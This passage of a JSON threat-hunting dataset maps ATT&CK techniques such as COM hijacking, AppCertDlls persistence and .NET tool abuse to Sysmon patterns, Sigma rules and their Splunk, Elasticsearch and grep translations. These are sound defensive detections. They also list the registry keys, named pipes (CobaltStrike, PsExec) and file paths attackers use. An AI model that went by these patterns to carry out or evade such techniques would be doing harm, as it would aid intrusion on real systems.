"queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - .Net Environment Execution", "command": "\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe", "name": null}], "command_list": ["\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe"], "technique_id": "C1002", "parsed_datasets": [{"SysmonHunter - C1002": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": ".Net Environment Execution", "level": "medium"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - Component Object Model Hijacking", "command": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "name": null}, {"source": "SysmonHunter - Component Object Model Hijacking", "command": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "name": null}], "command_list": ["\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32"], "technique_id": "T1122", "parsed_datasets": [{"SysmonHunter - T1122": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "flag": "regex"}}}, {"process": {"cmdline": {"pattern": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Component Object Model Hijacking", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\Software\\\\Classes\\\\CLSID\\\\\"", "product": "Azure Sentinel", "name": "Component Object Model Hijacking"}, {"query": "title: Windows Registry Persistence - COM key linking\nid: 9b0f8a61-91b2-464f-aceb-0527e0a45020\nstatus: experimental\ndescription: Detects COM object hijacking via TreatAs subkey\nreferences:\n    - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nauthor: Kutepov Anton, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/07\ntags:\n    - attack.persistence\n    - attack.t1122\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 12\n        TargetObject|startswith: 'HKU\\'\n        TargetObject|contains: '_Classes\\CLSID\\'\n        TargetObject|endswith: '\\TreatAs'\n    condition: selection\nfalsepositives: \n    - Maybe some system utilities in rare cases use linking keys for backward compability\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows Registry Persistence - COM key linking\nid: 9b0f8a61-91b2-464f-aceb-0527e0a45020\nstatus: experimental\ndescription: Detects COM object hijacking via TreatAs subkey\nreferences:\n    - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nauthor: Kutepov Anton, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/07\ntags:\n    - attack.persistence\n    - attack.t1122\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 12\n        TargetObject|startswith: 'HKU\\'\n        TargetObject|contains: '_Classes\\CLSID\\'\n        TargetObject|endswith: '\\TreatAs'\n    condition: selection\nfalsepositives: \n    - Maybe some system utilities in rare cases use linking keys for backward compability\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"12\" AND TargetObject:\"HKU\\\\*\" AND TargetObject.keyword:*_Classes\\\\\\\\CLSID\\\\* AND TargetObject.keyword:*\\\\\\\\TreatAs)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-Registry-Persistence---COM-key-linking <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows Registry Persistence - COM key linking\",\\n    \"description\": \"Detects COM object hijacking via TreatAs subkey\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1122\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"12\\\\\" AND TargetObject:\\\\\"HKU\\\\\\\\*\\\\\" AND TargetObject.keyword:*_Classes\\\\\\\\\\\\\\\\CLSID\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\TreatAs)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"12\\\\\" AND TargetObject:\\\\\"HKU\\\\\\\\*\\\\\" AND TargetObject.keyword:*_Classes\\\\\\\\\\\\\\\\CLSID\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\TreatAs)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows Registry Persistence - COM key linking\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"12\" AND TargetObject:\"HKU\\\\*\" AND TargetObject.keyword:*_Classes\\\\\\\\CLSID\\\\* AND TargetObject.keyword:*\\\\\\\\TreatAs)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"12\" TargetObject=\"HKU\\\\*\" TargetObject=\"*_Classes\\\\\\\\CLSID\\\\*\" TargetObject=\"*\\\\\\\\TreatAs\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"12\" TargetObject=\"HKU\\\\*\" TargetObject=\"*_Classes\\\\\\\\CLSID\\\\*\" TargetObject=\"*\\\\\\\\TreatAs\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*12)(?=.*HKU\\\\.*)(?=.*.*_Classes\\\\CLSID\\\\.*)(?=.*.*\\\\TreatAs))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - AppCert DLLs", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "name": null}, {"source": "SysmonHunter - AppCert DLLs", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "name": null}], "command_list": ["\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"], "technique_id": "T1182", "parsed_datasets": [{"SysmonHunter - T1182": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"}}}, {"process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"}}, "type": "process"}], "description": null, "name": "AppCert DLLs", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls\\\\\"", "product": "Azure Sentinel", "name": "AppCert DLLs"}, {"query": "title: New DLL added to AppCertDlls registry key\nid: 6aa1d992-5925-4e9f-a49b-845e51d1de01\nstatus: experimental\ndescription: Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\n    by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\nreferences:\n    - http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/\n    - https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html\ntags:\n    - attack.persistence\n    - attack.t1182\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: \n            - 12  # key create\n            - 13  # value set\n        TargetObject|contains: '\\SYSTEM\\'\n        TargetObject|endswith: '\\Control\\Session Manager\\AppCertDlls'\n      - EventID: 14  # key rename\n        NewName|contains: '\\SYSTEM\\'\n        NewName|endswith: '\\Control\\Session Manager\\AppCertDlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: New DLL added to AppCertDlls registry key\nid: 6aa1d992-5925-4e9f-a49b-845e51d1de01\nstatus: experimental\ndescription: Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\n    by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\nreferences:\n    - http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/\n    - https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html\ntags:\n    - attack.persistence\n    - attack.t1182\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: \n            - 12  # key create\n            - 13  # value set\n        TargetObject|contains: '\\SYSTEM\\'\n        TargetObject|endswith: '\\Control\\Session Manager\\AppCertDlls'\n      - EventID: 14  # key rename\n        NewName|contains: '\\SYSTEM\\'\n        NewName|endswith: '\\Control\\Session Manager\\AppCertDlls'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:(\"12\" OR \"13\") AND TargetObject.keyword:*\\\\\\\\SYSTEM\\\\* AND TargetObject.keyword:*\\\\\\\\Control\\\\\\\\Session\\\\ Manager\\\\\\\\AppCertDlls) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SYSTEM\\\\* AND NewName.keyword:*\\\\\\\\Control\\\\\\\\Session\\\\ Manager\\\\\\\\AppCertDlls))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/New-DLL-added-to-AppCertDlls-registry-key <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"New DLL added to AppCertDlls registry key\",\\n    \"description\": \"Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1182\"\\n    ],\\n    \"query\": \"((EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Session\\\\\\\\ Manager\\\\\\\\\\\\\\\\AppCertDlls) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Session\\\\\\\\ Manager\\\\\\\\\\\\\\\\AppCertDlls))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Session\\\\\\\\ Manager\\\\\\\\\\\\\\\\AppCertDlls) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Session\\\\\\\\ Manager\\\\\\\\\\\\\\\\AppCertDlls))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'New DLL added to AppCertDlls registry key\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n     EventID = {{_source.EventID}}\\\\n       Image = {{_source.Image}}\\\\nTargetObject = {{_source.TargetObject}}\\\\n     NewName = {{_source.NewName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:(\"12\" \"13\") AND TargetObject.keyword:*\\\\\\\\SYSTEM\\\\* AND TargetObject.keyword:*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SYSTEM\\\\* AND NewName.keyword:*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"12\" OR EventID=\"13\") TargetObject=\"*\\\\\\\\SYSTEM\\\\*\" TargetObject=\"*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls\") OR (EventID=\"14\" NewName=\"*\\\\\\\\SYSTEM\\\\*\" NewName=\"*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls\")) | table EventID,Image,TargetObject,NewName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id IN [\"12\", \"13\"] TargetObject=\"*\\\\\\\\SYSTEM\\\\*\" TargetObject=\"*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls\") OR (event_id=\"14\" NewName=\"*\\\\\\\\SYSTEM\\\\*\" NewName=\"*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\AppCertDlls\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*12|.*13))(?=.*.*\\\\SYSTEM\\\\.*)(?=.*.*\\\\Control\\\\Session Manager\\\\AppCertDlls))|.*(?:.*(?=.*14)(?=.*.*\\\\SYSTEM\\\\.*)(?=.*.*\\\\Control\\\\Session Manager\\\\AppCertDlls))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T0000", "parsed_datasets": [], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"Get-History\"or process_command_line contains \"AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt\"or process_command_line contains \"(Get-PSReadlineOption).HistorySavePath\")", "product": "Azure Sentinel", "name": "Console History"}, {"query": "Sysmon| where EventID == 17 and (pipe_name contains \"\\\\isapi_http\"or pipe_name contains \"\\\\isapi_dg\"or pipe_name contains \"\\\\isapi_dg2\"or pipe_name contains \"\\\\isapi_http\"or pipe_name contains \"\\\\sdlrpc\"or pipe_name contains \"\\\\aheec\"or pipe_name contains \"\\\\winsession\"or pipe_name contains \"\\\\lsassw\"or pipe_name contains \"\\\\rpchlp_3\"or pipe_name contains \"\\\\NamePipe_MoreWindows\"or pipe_name contains \"\\\\pcheap_reuse\"or pipe_name contains \"\\\\PSEXESVC\"or pipe_name contains \"\\\\PowerShellISEPipeName_\"or pipe_name contains \"\\\\csexec\"or pipe_name contains \"\\\\paexec\"or pipe_name contains \"\\\\remcom\")", "product": "Azure Sentinel", "name": "Named Pipes"}, {"query": "Sysmon| where EventID == 17 and pipe_name contains \"\\\\msagent_\"", "product": "Azure Sentinel", "name": "Named Pipes CobaltStrike"}, {"query": "Sysmon| where EventID == 3 and process_path contains \"qwinsta.exe\"", "product": "Azure Sentinel", "name": "Remotely Query Login Sessions Network"}, {"query": "Sysmon| where EventID == 1 and process_path contains \"qwinsta.exe\"", "product": "Azure Sentinel", "name": "Remotely Query Login Sessions Process"}, {"query": "Sysmon| where EventID == 1 and (process_path == \"a.exe\"or process_path == \"b.exe\"or process_path == \"c.exe\"or process_path == \"d.exe\"or process_path == \"e.exe\"or process_path == \"f.exe\"or process_path == \"g.exe\"or process_path == \"h.exe\"or process_path == \"i.exe\"or process_path == \"j.exe\"or process_path == \"k.exe\"or process_path == \"l.exe\"or process_path == \"m.exe\"or process_path == \"n.exe\"or process_path == \"o.exe\"or process_path == \"p.exe\"or process_path == \"q.exe\"or process_path == \"r.exe\"or process_path == \"s.exe\"or process_path == \"t.exe\"or process_path == \"u.exe\"or process_path == \"v.exe\"or process_path == \"w.exe\"or process_path == \"x.exe\"or process_path == \"y.exe\"or process_path == \"z.exe\"or process_path == \"1.exe\"or process_path == \"2.exe\"or process_path == \"3.exe\"or process_path == \"4.exe\"or process_path == \"5.exe\"or process_path == \"6.exe\"or process_path == \"7.exe\"or process_path == \"8.exe\"or process_path == \"9.exe\"or process_path == \"0.exe\"or process_path == \"10.exe\")", "product": "Azure Sentinel", "name": "Suspicious Filename Used"}, {"query": "title: Antivirus Relevant File Paths Alerts\nid: c9a88268-0047-4824-ba6e-4d81ce0b907c\ndescription: Detects an Antivirus alert in a highly relevant file path or with a relevant file name\ndate: 2018/09/09\nmodified: 2019/10/04\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        FileName:\n            - 'C:\\Windows\\Temp\\\\*'\n            - 'C:\\Temp\\\\*'\n            - '*\\\\Client\\\\*'\n            - 'C:\\PerfLogs\\\\*'\n            - 'C:\\Users\\Public\\\\*'\n            - 'C:\\Users\\Default\\\\*'\n            - '*.ps1'\n            - '*.vbs'\n            - '*.bat'\n            - '*.chm'\n            - '*.xml'\n            - '*.txt'\n            - '*.jsp'\n            - '*.jspx'\n            - '*.asp'\n            - '*.aspx'\n            - '*.php'\n            - '*.war'\n            - '*.hta'\n            - '*.lnk'\n            - '*.scf'\n            - '*.sct'\n            - '*.vbe'\n            - '*.wsf'\n            - '*.wsh'\n    condition: selection\nfields:\n    - Signature\n    - User\nfalsepositives:\n    - Unlikely\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "FileName.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* OR C\\\\:\\\\\\\\Temp\\\\\\\\* OR *\\\\\\\\Client\\\\\\\\* OR C\\\\:\\\\\\\\PerfLogs\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* OR *.ps1 OR *.vbs OR *.bat OR *.chm OR *.xml OR *.txt OR *.jsp OR *.jspx OR *.asp OR *.aspx OR *.php OR *.war OR *.hta OR *.lnk OR *.scf OR *.sct OR *.vbe OR *.wsf OR *.wsh)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Antivirus-Relevant-File-Paths-Alerts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Antivirus Relevant File Paths Alerts\",\\n    \"description\": \"Detects an Antivirus alert in a highly relevant file path or with a relevant file name\",\\n    \"tags\": \"\",\\n    \"query\": \"FileName.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Client\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\PerfLogs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *.ps1 OR *.vbs OR *.bat OR *.chm OR *.xml OR *.txt OR *.jsp OR *.jspx OR *.asp OR *.aspx OR *.php OR *.war OR *.hta OR *.lnk OR *.scf OR *.sct OR *.vbe OR *.wsf OR *.wsh)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"FileName.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Client\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\PerfLogs\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *.ps1 OR *.vbs OR *.bat OR *.chm OR *.xml OR *.txt OR *.jsp OR *.jspx OR *.asp OR *.aspx OR *.php OR *.war OR *.hta OR *.lnk OR *.scf OR *.sct OR *.vbe OR *.wsf OR *.wsh)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Antivirus Relevant File Paths Alerts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nSignature = {{_source.Signature}}\\\\n     User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "FileName.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* C\\\\:\\\\\\\\Temp\\\\\\\\* *\\\\\\\\Client\\\\\\\\* C\\\\:\\\\\\\\PerfLogs\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* *.ps1 *.vbs *.bat *.chm *.xml *.txt *.jsp *.jspx *.asp *.aspx *.php *.war *.hta *.lnk *.scf *.sct *.vbe *.wsf *.wsh)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(FileName=\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\" OR FileName=\"C:\\\\\\\\Temp\\\\\\\\*\" OR FileName=\"*\\\\\\\\Client\\\\\\\\*\" OR FileName=\"C:\\\\\\\\PerfLogs\\\\\\\\*\" OR FileName=\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR FileName=\"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\" OR FileName=\"*.ps1\" OR FileName=\"*.vbs\" OR FileName=\"*.bat\" OR FileName=\"*.chm\" OR FileName=\"*.xml\" OR FileName=\"*.txt\" OR FileName=\"*.jsp\" OR FileName=\"*.jspx\" OR FileName=\"*.asp\" OR FileName=\"*.aspx\" OR FileName=\"*.php\" OR FileName=\"*.war\" OR FileName=\"*.hta\" OR FileName=\"*.lnk\" OR FileName=\"*.scf\" OR FileName=\"*.sct\" OR FileName=\"*.vbe\" OR FileName=\"*.wsf\" OR FileName=\"*.wsh\") | table Signature,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "FileName IN [\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\", \"C:\\\\\\\\Temp\\\\\\\\*\", \"*\\\\\\\\Client\\\\\\\\*\", \"C:\\\\\\\\PerfLogs\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\", \"*.ps1\", \"*.vbs\", \"*.bat\", \"*.chm\", \"*.xml\", \"*.txt\", \"*.jsp\", \"*.jspx\", \"*.asp\", \"*.aspx\", \"*.php\", \"*.war\", \"*.hta\", \"*.lnk\", \"*.scf\", \"*.sct\", \"*.vbe\", \"*.wsf\", \"*.wsh\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*C:\\\\Windows\\\\Temp\\\\\\\\.*|.*C:\\\\Temp\\\\\\\\.*|.*.*\\\\\\\\Client\\\\\\\\.*|.*C:\\\\PerfLogs\\\\\\\\.*|.*C:\\\\Users\\\\Public\\\\\\\\.*|.*C:\\\\Users\\\\Default\\\\\\\\.*|.*.*\\\\.ps1|.*.*\\\\.vbs|.*.*\\\\.bat|.*.*\\\\.chm|.*.*\\\\.xml|.*.*\\\\.txt|.*.*\\\\.jsp|.*.*\\\\.jspx|.*.*\\\\.asp|.*.*\\\\.aspx|.*.*\\\\.php|.*.*\\\\.war|.*.*\\\\.hta|.*.*\\\\.lnk|.*.*\\\\.scf|.*.*\\\\.sct|.*.*\\\\.vbe|.*.*\\\\.wsf|.*.*\\\\.wsh)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Alternate PowerShell Hosts\nid: 64e8e417-c19a-475a-8d19-98ea705394cc\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\nstatus: experimental\ndate: 2019/08/11\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/alternate_signed_powershell_hosts.md\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection: \n        EventID:\n            - 4103\n            - 400\n    filter:\n        HostApplication: 'powershell.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", 